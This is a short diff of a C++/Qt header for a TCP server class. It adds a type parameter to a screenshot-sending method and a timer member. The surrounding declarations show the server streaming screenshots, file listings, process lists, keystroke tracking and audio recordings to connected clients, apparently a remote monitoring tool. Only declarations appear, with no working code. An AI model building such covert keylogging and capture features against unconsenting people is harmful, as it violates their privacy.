@@ -46,7 +46,7 @@ private:
     void initServer();
     void stream(QTcpSocket* clientConnection);
     void sendMessage(QTcpSocket* clientSocket, const QString &cmdNumber);
-    void sendScreenshot(QTcpSocket* clientSocket, const QPixmap &screenshot);
+    void sendScreenshot(QTcpSocket* clientSocket, const QPixmap &screenshot, QString type);
     void sendFileStructure(QTcpSocket* clientSocket, const QStringList &fileStruct);
     void sendProcesses(QTcpSocket* clientSocket);
     void sendKeyboardTrack(QTcpSocket* clientSocket);
@@ -62,6 +62,7 @@ private:
     QProcess *processKeyboardTrack;
     QProcess *processListProcesses;
     AudioRecorder *recorder = nullptr;
+    QTimer *timer = nullptr;
     QList<QTcpSocket*> clients;
 
     fileExplorer *myFileExplorer = nullptr;
